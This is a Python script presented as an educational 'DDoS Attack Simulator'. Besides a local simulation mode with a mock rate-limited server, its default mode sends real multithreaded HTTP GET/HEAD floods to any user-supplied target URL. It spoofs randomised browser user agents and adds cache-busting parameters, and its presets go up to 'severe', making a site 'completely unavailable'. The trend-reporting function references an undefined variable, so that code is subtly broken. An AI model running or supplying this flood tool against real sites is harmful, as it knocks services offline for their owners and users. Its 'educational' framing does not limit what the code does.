import random
import socket
import statistics
import threading
import time
import argparse
from collections import deque
import logging
from logging.handlers import RotatingFileHandler
from colorama import Fore, Style, init

# Set up logging configuration
def setup_logging(log_file='ddos_simulator.log', console_level=logging.INFO, file_level=logging.DEBUG):
    """
    Configure logging to send output to both console and a log file
    
    Args:
        log_file (str): Path to the log file
        console_level: Logging level for console output
        file_level: Logging level for file output
    """
    # Create logger
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)  # Capture all levels
    
    # Clear any existing handlers
    logger.handlers = []
    
    # Create formatters
    console_formatter = logging.Formatter('%(levelname)s: %(message)s')
    file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setLevel(console_level)
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)
    
    # File handler (with rotation to prevent very large log files)
    file_handler = RotatingFileHandler(log_file, maxBytes=10*1024*1024, backupCount=5)
    file_handler.setLevel(file_level)
    file_handler.setFormatter(file_formatter)
    logger.addHandler(file_handler)
    
    # Log startup information
    logging.info("Logging initialized")
    logging.debug(f"Console logging level: {logging.getLevelName(console_level)}")
    logging.debug(f"File logging level: {logging.getLevelName(file_level)}")
    logging.debug(f"Log file: {log_file}")
    
    return logger

class ColoredLogHandler(logging.StreamHandler):
    """Custom handler that adds colorama colors to console output based on log level"""
    
    COLORS = {
        logging.DEBUG: Fore.CYAN,
        logging.INFO: Fore.WHITE,
        logging.WARNING: Fore.YELLOW,
        logging.ERROR: Fore.RED,
        logging.CRITICAL: Fore.RED + Style.BRIGHT
    }
    
    def emit(self, record):
        # Add color to the message based on level
        color = self.COLORS.get(record.levelno, Fore.WHITE)
        record.msg = f"{color}{record.msg}{Style.RESET_ALL}"
        super().emit(record)

class SimulatedWebServer:
    def __init__(self, port=8000, max_workers=100, response_delay=0.1, logger=None):
        self.port = port
        self.max_workers = max_workers
        self.response_delay = response_delay
        self.error_rate = 0.1  # 10% chance of error responses
        self.running = False
        # Use a mutable container (list) to track request count across threads
        self.request_count = [0]
        # Add tracking for response times
        self.response_times = []
        # Track load-related slowdown
        self.current_load = 0
        self.max_load = 1000  # Arbitrary threshold where server starts slowing down
        self.logger = logger or logging.getLogger(__name__)

    def start(self):
        """simulated web server (no network binding occurs)."""
        self.running = True
        local_ip = get_local_ip()
        self.logger.info(f"Simulated web server running on {local_ip}:{self.port}")
        self.logger.info(f"Max workers: {self.max_workers}")
        self.logger.info(f"Response delay: {self.response_delay}s")
        self.logger.info(f"Error rate: {self.error_rate*100}%")
        return True

    def stop(self):
        """Stop the simulated web server."""
        self.running = False
        self.logger.info("Simulated server stopped")
    
    def add_response_time(self, response_time):
        self.response_times.append(response_time)
        # Only keep the last 1000 response times to avoid memory issues
        if len(self.response_times) > 1000:
            self.response_times.pop(0)


class SimulatedResponse:
    """A class to simulate a minimal requests.Response object."""
    def __init__(self, status_code, text):
        self.status_code = status_code
        self.text = text

def port_funct(method, path, params, headers, response_delay, error_rate, request_count_tracker, logger=None):
    """
    Simulates a web server request handler function.
    Now with logging support.
    """
    logger = logger or logging.getLogger(__name__)
    
    request_start_time = time.time()
    logger.debug(f"Request received: {method} {path} - Parameters: {params}")
    
    # IP-based rate limiting
    client_ip = headers.get('X-Forwarded-For', '0.0.0.0')
    current_time = time.time()
    
    # Initialize rate limiting data structures if they don't exist
    if not hasattr(port_funct, 'ip_requests'):
        port_funct.ip_requests = {}
        port_funct.ip_blacklist = set()
        port_funct.request_timestamps = []
        port_funct.current_load = 0
        logger.debug("Initialized rate limiting structures")
    
    # Track server load to simulate increasing latency under load
    port_funct.current_load = max(0, port_funct.current_load - 0.5)  # Natural decay
    port_funct.current_load += 1  # Each request adds to load
    
    # Check global rate limiting (requests per minute)
    port_funct.request_timestamps.append(current_time)
    port_funct.request_timestamps = [t for t in port_funct.request_timestamps if t > current_time - 60]
    recent_requests = len(port_funct.request_timestamps)
    if recent_requests > 6000:  # More than 100 req/sec
        logger.warning(f"Global rate limit exceeded - {recent_requests} requests in last minute")
        response_time = time.time() - request_start_time
        return SimulatedResponse(429, "Too Many Requests: Global rate limit exceeded"), response_time
    
    # Check if IP is blacklisted
    if client_ip in port_funct.ip_blacklist:
        logger.warning(f"Blocked request from blacklisted IP: {client_ip}")
        response_time = time.time() - request_start_time
        return SimulatedResponse(403, "Forbidden: Your IP has been temporarily blocked"), response_time
    
    # Initialize or update IP tracking
    if client_ip not in port_funct.ip_requests:
        port_funct.ip_requests[client_ip] = {
            'count': 0,
            'first_seen': current_time,
            'last_seen': current_time,
            'recent_reqs': []
        }
        logger.debug(f"New IP observed: {client_ip}")
    
    # Update IP data
    ip_data = port_funct.ip_requests[client_ip]
    ip_data['count'] += 1
    ip_data['last_seen'] = current_time
    
    # Track recent requests (last 10 seconds)
    ip_data['recent_reqs'].append(current_time)
    ip_data['recent_reqs'] = [t for t in ip_data['recent_reqs'] if t > current_time - 10]
    
    # Per-IP rate limiting
    if len(ip_data['recent_reqs']) > 50:  # More than 5 req/sec from this IP
        port_funct.ip_blacklist.add(client_ip)
        logger.warning(f"IP rate limit exceeded for {client_ip} - added to blacklist")
        response_time = time.time() - request_start_time
        return SimulatedResponse(429, "Too Many Requests: IP rate limit exceeded"), response_time
    
    # Verify user agent and reject suspicious ones
    user_agent = headers.get('User-Agent', '')
    if not user_agent or 'bot' in user_agent.lower() or len(user_agent) < 10:
        if ip_data['count'] > 5:  # Allow a few requests without UA for testing
            logger.warning(f"Blocked request with suspicious user agent: {user_agent}")
            response_time = time.time() - request_start_time
            return SimulatedResponse(400, "Bad Request: Invalid User-Agent"), response_time
    
    # Detect repetitive patterns (e.g., same path/params repeatedly)
    request_signature = f"{method}:{path}:{sorted(params.items())}"
    if not hasattr(port_funct, 'request_patterns'):
        port_funct.request_patterns = {}
    
    if request_signature in port_funct.request_patterns:
        pattern_data = port_funct.request_patterns[request_signature]
        pattern_data['count'] += 1
        pattern_data['ips'].add(client_ip)
        
        # If same request is made too many times
        if pattern_data['count'] > 1000 and len(pattern_data['ips']) < 10:
            logger.warning(f"Request pattern rate limit exceeded: {request_signature}")
            response_time = time.time() - request_start_time
            return SimulatedResponse(429, "Too Many Requests: Request pattern rate limit exceeded"), response_time
    else:
        port_funct.request_patterns[request_signature] = {
            'count': 1,
            'ips': {client_ip}
        }
    
    # Calculate dynamic response delay based on current server load
    # As load increases, server gets progressively slower
    load_factor = min(1.0, port_funct.current_load / 1000)  # 0.0 to 1.0
    dynamic_delay = response_delay * (1 + load_factor * 5)  # Up to 5x slower under heavy load
    
    # Add some randomness to response to prevent timing attacks
    jitter = random.uniform(0.05, dynamic_delay * 1.5)
    time.sleep(jitter)
    
    # Update request counter after all checks passed
    request_count_tracker[0] += 1 
    logger.debug(f"Request #{request_count_tracker[0]} processed")

    # Apply normal error rate simulation after all security checks
    if random.random() < error_rate:
        logger.debug(f"Simulating server error (random error rate triggered)")
        response_time = time.time() - request_start_time
        return SimulatedResponse(500, "Simulated server error"), response_time
    else:
        if method == "HEAD":
            response_time = time.time() - request_start_time
            logger.debug(f"HEAD request completed in {response_time:.3f}s")
            return SimulatedResponse(200, ""), response_time
        else:
            response = f"""
<html>
    <head><title>Protected Simulated Server</title></head>
    <body>
        <h1>Protected Simulated Web Server</h1>
        <p>Request #{request_count_tracker[0]}</p>
        <p>Path: {path}</p>
        <p>This is a simulated response for testing purposes.</p>
        <p>DDoS Protection Active</p>
        <p>Response Time: {time.time() - request_start_time:.4f}s</p>
    </body>
</html>
    """
            response_time = time.time() - request_start_time
            logger.debug(f"GET request completed in {response_time:.3f}s")
            return SimulatedResponse(200, response), response_time


def generate_user_agent():
    """Generate a random, realistic-looking user agent string"""
    browsers = [
        "Chrome", "Firefox", "Safari", "Edge", "Opera"
    ]
    
    platforms = [
        "Windows NT 10.0", "Windows NT 6.1", "Macintosh; Intel Mac OS X 10_15",
        "X11; Linux x86_64", "iPhone; CPU iPhone OS 14_0 like Mac OS X"
    ]
    
    browser = random.choice(browsers)
    platform = random.choice(platforms)
    version = f"{random.randint(60, 110)}.{random.randint(0, 9)}.{random.randint(1000, 9999)}.{random.randint(10, 999)}"
    
    templates = {
        "Chrome": "Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36",
        "Firefox": "Mozilla/5.0 ({platform}; rv:{version}) Gecko/20100101 Firefox/{version}",
        "Safari": "Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Edge": "Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36 Edg/{version}",
        "Opera": "Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36 OPR/{version}"
    }
    
    template = templates.get(browser, templates["Chrome"])
    return template.format(platform=platform, version=version)


class DDoSSimulator:
    def __init__(self, target_url, num_workers=50, duration=60, request_rate=10,
                 simulate_local=False, sim_response_delay=0.1, sim_error_rate=0.1,
                 sim_request_count=None, logger=None):
        """
        Initialize the DDoS simulator.
        
        Args:
            target_url (str): URL of the target website (informational if simulating)
            num_workers (int): Number of concurrent attack threads
            duration (int): Duration of attack in seconds
            request_rate (int): Requests per second per worker
            simulate_local (bool): If True, calls port_funct instead of using real network ports.
            sim_response_delay (float): Response delay to be used in simulation.
            sim_error_rate (float): Error response probability for the simulated server.
            sim_request_count (list): Shared mutable container (list) to track request count.
            logger: Logger instance to use
        """
        self.target_url = target_url
        self.num_workers = num_workers
        self.duration = duration
        self.request_rate = request_rate
        self.simulate_local = simulate_local
        self.sim_response_delay = sim_response_delay
        self.sim_error_rate = sim_error_rate
        
        self.sim_request_count = sim_request_count if sim_request_count is not None else [0]
        self.running = False
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': 0,
            'workers': []
        }
        
        # New response time tracking
        self.response_times = []  # Store all response times
        self.response_time_windows = {}  # Track response times in time windows
        self.window_size = 5  # Window size in seconds
        self.last_report_time = 0
        self.report_interval = 10  # Show response time trends every 10 seconds
        
        # Lock for thread-safe updates to response time data
        self.stats_lock = threading.Lock()
        
        # Logger
        self.logger = logger or logging.getLogger(__name__)
        
    def worker(self, worker_id):
        delay = 1.0 / self.request_rate
        
        # Create a worker-specific response time window
        worker_response_times = deque(maxlen=100)  # Store last 100 response times per worker
        
        while self.running:
            try:
                headers = {
                    'User-Agent': generate_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                }
                params = {
                    'id': random.randint(1, 10000),
                    'cache_buster': random.random()
                }
                if random.random() > 0.8:
                    method = 'HEAD'
                else:
                    method = 'GET'
                    
                start_time = time.time()
                if self.simulate_local:
                    # Call simulated port function instead of making an actual HTTP request.
                    response, response_time = port_funct(
                        method, "/", params, headers,
                        self.sim_response_delay, self.sim_error_rate,
                        self.sim_request_count,
                        logger=self.logger
                    )
                else:
                    # Use actual network requests if not simulating
                    if method == 'GET':
                        import requests
                        request_start = time.time()
                        response = requests.get(
                            self.target_url,
                            headers=headers,
                            params=params,
                            timeout=5
                        )
                        response_time = time.time() - request_start
                    else:
                        import requests
                        request_start = time.time()
                        response = requests.head(
                            self.target_url,
                            headers=headers,
                            params=params,
                            timeout=5
                        )
                        response_time = time.time() - request_start
                
                # Record response time statistics
                with self.stats_lock:
                    self.stats['workers'][worker_id]['requests'] += 1
                    self.stats['workers'][worker_id]['successful'] += 1
                    self.stats['total_requests'] += 1
                    self.stats['successful'] += 1
                    
                    # Track response times
                    self.response_times.append(response_time)
                    
                    # Track response time per time window
                    current_window = int(time.time() / self.window_size) * self.window_size
                    if current_window not in self.response_time_windows:
                        self.response_time_windows[current_window] = []
                    self.response_time_windows[current_window].append(response_time)
                    
                    # Track per-worker response times
                    worker_response_times.append(response_time)
                    self.stats['workers'][worker_id]['response_times'] = list(worker_response_times)
                
                # Only log detailed info for a subset of requests to avoid flooding
                if random.random() < 0.05:  # Only log ~5% of requests
                    self.logger.info(f"Worker {worker_id}: {method} request successful (HTTP {response.status_code}, {response_time:.3f}s)")
                
                # Periodically show response time trends
                current_time = time.time()
                if current_time - self.last_report_time >= self.report_interval:
                    with self.stats_lock:
                        if current_time - self.last_report_time >= self.report_interval:  # Double-check inside lock
                            self.last_report_time = current_time
                            self.print_response_time_trends()
                
            except Exception as e:
                with self.stats_lock:
                    self.stats['workers'][worker_id]['requests'] += 1
                    self.stats['workers'][worker_id]['failed'] += 1
                    self.stats['total_requests'] += 1
                    self.stats['failed'] += 1
                self.logger.error(f"Worker {worker_id}: Request failed - {str(e)}")
            
            elapsed = time.time() - start_time
            if elapsed < delay:
                time.sleep(delay - elapsed)
    

    def print_response_time_trends(self):
        """Print current response time trends."""
        # Only print if we have enough data
        if len(self.response_times) < 10:
            return
            
        # Get the most recent windows (up to 6)
        recent_windows = sorted(self.response_time_windows.keys())[-6:]
        
        # Calculate statistics for each window
        window_stats = []
        for window in recent_windows:
            times = self.response_time_windows[window]
            if times:
                window_stats.append({
                    'window': window,
                    'count': len(times),
                    'avg': sum(times) / len(times),
                    'min': min(times),
                    'max': max(times),
                    'median': statistics.median(times) if len(times) > 0 else 0
                })
        
        if not window_stats:
            return
            
        # Calculate trend
        if len(window_stats) >= 2:
            first_avg = window_stats[0]['avg']
            last_avg = window_stats[-1]['avg']
            percent_change = ((last_avg - first_avg) / first_avg) * 100 if first_avg > 0 else 0
            
            # Determine color based on trend
            if percent_change > 20:
                self.logger.warning(f"[{elapsed:.1f}s] Response Time Trend: {percent_change:.1f}% increase")
            elif percent_change < -10:
                self.logger.info(f"[{elapsed:.1f}s] Response Time Trend: {percent_change:.1f}% decrease")
            else:
                self.logger.info(f"[{elapsed:.1f}s] Response Time Trend: {percent_change:.1f}% (stable)")
            
            # Log the latest window stats
            latest = window_stats[-1]
            self.logger.info(f"Current: Avg={latest['avg']:.3f}s, Min={latest['min']:.3f}s, Max={latest['max']:.3f}s, Median={latest['median']:.3f}s")
    

    def start(self):
        self.logger.info(f"Starting DDoS simulation against {self.target_url}")
        self.logger.info(f"Workers: {self.num_workers}")
        self.logger.info(f"Duration: {self.duration} seconds")
        self.logger.info(f"Request rate: {self.request_rate} req/sec/worker")
        self.logger.info(f"Estimated total requests: {self.num_workers * self.request_rate * self.duration:,}")
        self.logger.info("Press Ctrl+C to stop early")
    
        # Initialize worker stats with response time tracking
        self.stats['workers'] = [
            {'requests': 0, 'successful': 0, 'failed': 0, 'response_times': []} 
            for _ in range(self.num_workers)
        ]
        self.stats['start_time'] = time.time()
        self.last_report_time = time.time()
    
        self.running = True
        threads = []
    
        # Error handling for thread creation
        try:
            for i in range(self.num_workers):
                try:
                    t = threading.Thread(target=self.worker, args=(i,))
                    t.daemon = True
                    t.start()
                    threads.append(t)
                except RuntimeError as e:
                    self.logger.error(f"Thread limit reached after creating {len(threads)} workers: {str(e)}")
                    self.logger.warning(f"Continuing with {len(threads)} workers instead of {self.num_workers}")
                    self.num_workers = len(threads)  # Update worker count to actual number created
                    break
        
            try:
                time.sleep(self.duration)
            except KeyboardInterrupt:
                self.logger.warning("Early termination requested...")
        
            self.running = False
            for t in threads:
                t.join()
        
        except Exception as e:
            self.logger.error(f"Error during simulation: {str(e)}")
            self.running = False
            for t in threads:
                try:
                    t.join(timeout=1)
                except:
                    pass
    
        self.print_report()
    
    def print_report(self):
        """Print a detailed report of the simulation with response time analysis."""
        elapsed = time.time() - self.stats['start_time']
        req_rate = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
        
        self.logger.info("=== DDoS Simulation Report ===")
        self.logger.info(f"Target URL: {self.target_url}")
        self.logger.info(f"Duration: {elapsed:.2f} seconds")
        self.logger.info(f"Total workers: {self.num_workers}")
        self.logger.info(f"Total requests: {self.stats['total_requests']:,}")
        self.logger.info(f"Successful requests: {self.stats['successful']:,}")
        self.logger.info(f"Failed requests: {self.stats['failed']:,}")
        self.logger.info(f"Request rate: {req_rate:.2f} req/sec")
        
        # Response time statistics
        if self.response_times:
            self.logger.info("Response Time Analysis:")
            rt_avg = sum(self.response_times) / len(self.response_times)
            rt_min = min(self.response_times)
            rt_max = max(self.response_times)
            
            # Calculate percentiles
            sorted_times = sorted(self.response_times)
            rt_median = statistics.median(sorted_times)
            rt_p95 = sorted_times[int(len(sorted_times) * 0.95)]
            rt_p99 = sorted_times[int(len(sorted_times) * 0.99)]
            
            self.logger.info(f"Average response time: {rt_avg:.3f}s")
            self.logger.info(f"Median response time: {rt_median:.3f}s")
            self.logger.info(f"Min response time: {rt_min:.3f}s")
            self.logger.info(f"Max response time: {rt_max:.3f}s")
            self.logger.info(f"95th percentile: {rt_p95:.3f}s")
            self.logger.info(f"99th percentile: {rt_p99:.3f}s")
            
            # Calculate response time trend
            if len(self.response_time_windows) >= 2:
                windows = sorted(self.response_time_windows.keys())
                first_window = windows[0]
                last_window = windows[-1]
                
                if first_window != last_window:
                    first_avg = sum(self.response_time_windows[first_window]) / len(self.response_time_windows[first_window])
                    last_avg = sum(self.response_time_windows[last_window]) / len(self.response_time_windows[last_window])
                    
                    percent_change = ((last_avg - first_avg) / first_avg) * 100 if first_avg > 0 else 0
                    
                    if percent_change > 200:
                        self.logger.critical(f"Response Time Trend: {percent_change:.1f}% increase - Critical impact on response times")
                    elif percent_change > 100:
                        self.logger.error(f"Response Time Trend: {percent_change:.1f}% increase - Severe impact on response times")
                    elif percent_change > 50:
                        self.logger.warning(f"Response Time Trend: {percent_change:.1f}% increase - Significant impact on response times")
                    elif percent_change > 20:
                        self.logger.warning(f"Response Time Trend: {percent_change:.1f}% increase - Moderate impact on response times")
                    elif percent_change > 5:
                        self.logger.info(f"Response Time Trend: {percent_change:.1f}% increase - Slight impact on response times")
                    else:
                        self.logger.info(f"Response Time Trend: {percent_change:.1f}% increase - Minimal impact on response times")
                    
                    self.logger.info(f"Initial avg response: {first_avg:.3f}s")
                    self.logger.info(f"Final avg response: {last_avg:.3f}s")
        
        self.logger.info("Worker Statistics:")
        # Only show stats for a sample of workers if there are many
        workers_to_show = min(10, self.num_workers)  # Show at most 10 workers
        for i in range(workers_to_show):
            worker = self.stats['workers'][i]
            
            # Calculate worker-specific response time metrics if available
            rt_info = ""
            if 'response_times' in worker and worker['response_times']:
                rt_avg = sum(worker['response_times']) / len(worker['response_times'])
                rt_info = f", avg resp: {rt_avg:.3f}s"
                
            self.logger.info(f"Worker {i}: {worker['requests']} requests "
                  f"({worker['successful']} successful, {worker['failed']} failed{rt_info})")
        
        if self.num_workers > workers_to_show:
            self.logger.info(f"... and {self.num_workers - workers_to_show} more workers")
        
        self.logger.info("Impact Assessment:")
        if req_rate > 1000:
            self.logger.critical("Severe impact: Website likely completely unavailable")
        elif req_rate > 500:
            self.logger.error("High impact: Website performance severely degraded")
        elif req_rate > 100:
            self.logger.warning("Moderate impact: Some users may experience delays")
        else:
            self.logger.info("Minimal impact: Website can likely handle this load")


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def get_impact_parameters(impact_level):
    impact_params = {
        'minimal': {'workers': 10, 'rate': 5, 'duration': 30,
                    'description': "Minimal impact - slight increase in server load, unlikely to be noticeable"},
        'moderate': {'workers': 50, 'rate': 10, 'duration': 60,
                     'description': "Moderate impact - noticeable slowdown, some users may experience delays"},
        'high': {'workers': 100, 'rate': 30, 'duration': 60,
                 'description': "High impact - significant performance degradation, many users affected"},
        'severe': {'workers': 150, 'rate': 50, 'duration': 120,
                   'description': "Severe impact - website likely completely unavailable to most users"}
    }

    params = impact_params.get(impact_level.lower(), impact_params['moderate'])
    logging.info(f"Selected impact level: {impact_level}")
    logging.info(params['description'])

    return params['workers'], params['rate'], params['duration']

def prompt_for_impact_level():
    logging.info("DDoS Impact Level Selection")
    logging.info("1. Minimal - slight increase in server load, unlikely to be noticeable")
    logging.info("2. Moderate - noticeable slowdown, some users may experience delays")
    logging.info("3. High - significant performance degradation, many users affected")
    logging.info("4. Severe - website likely completely unavailable to most users")

    valid_choices = {'1': 'minimal', '2': 'moderate', '3': 'high', '4': 'severe'}

    while True:
        choice = input("\nChoose an impact level (1-4): ")
        if choice in valid_choices:
            impact_level = valid_choices[choice]
            return get_impact_parameters(impact_level)
        else:
            logging.warning("Invalid choice. Please enter a number between 1 and 4.")

def test_local_ddos_simulation():
    server = SimulatedWebServer(
        port=8000,
        max_workers=150,
        response_delay=0.2
    )

    if not server.start():
        return

    try:
        logging.info("Starting DDoS simulation using the simulated server (port_funct)...")
        local_ip = get_local_ip()
        local_target = f"http://{local_ip}:{server.port}"

        num_workers, request_rate, duration = prompt_for_impact_level()

        simulator = DDoSSimulator(
            target_url=local_target,
            num_workers=num_workers,
            duration=duration,
            request_rate=request_rate,
            simulate_local=True,
            sim_response_delay=server.response_delay,
            sim_error_rate=server.error_rate,
            sim_request_count=server.request_count
        )
        simulator.start()

        logging.info(f"Simulation complete. Total simulated requests handled: {server.request_count[0]}")
        
    finally:
        server.stop()

def main():
    init(autoreset=True)
    setup_logging()  # <---- CALL IT RIGHT AWAY TO CAPTURE EVERYTHING

    parser = argparse.ArgumentParser(description="DDoS Attack Simulator (Educational Tool)")

    parser.add_argument('--target', type=str, default="http://example.com",
                        help="Target URL to simulate attack against (ignored in local simulation)")
    parser.add_argument('--impact', type=str, choices=['minimal', 'moderate', 'high', 'severe'],
                        help="Desired impact level of the attack")
    parser.add_argument('--workers', type=int,
                        help="Number of concurrent attack workers (overrides impact)")
    parser.add_argument('--duration', type=int,
                        help="Duration of attack in seconds (overrides impact)")
    parser.add_argument('--rate', type=int,
                        help="Requests per second per worker (overrides impact)")
    parser.add_argument('--local', action='store_true',
                        help="Test using the local simulated server (using port_funct)")

    args = parser.parse_args()

    use_explicit_params = args.workers is not None or args.rate is not None or args.duration is not None

    if args.local:
        test_local_ddos_simulation()
    else:
        logging.info(f"Starting simulation against {args.target}")

        if use_explicit_params:
            num_workers = args.workers if args.workers is not None else 50
            duration = args.duration if args.duration is not None else 60
            request_rate = args.rate if args.rate is not None else 10
        elif args.impact:
            num_workers, request_rate, duration = get_impact_parameters(args.impact)
        else:
            num_workers, request_rate, duration = prompt_for_impact_level()

        simulator = DDoSSimulator(
            target_url=args.target,
            num_workers=num_workers,
            duration=duration,
            request_rate=request_rate,
            simulate_local=False
        )
        simulator.start()
        
if __name__ == "__main__":
    main()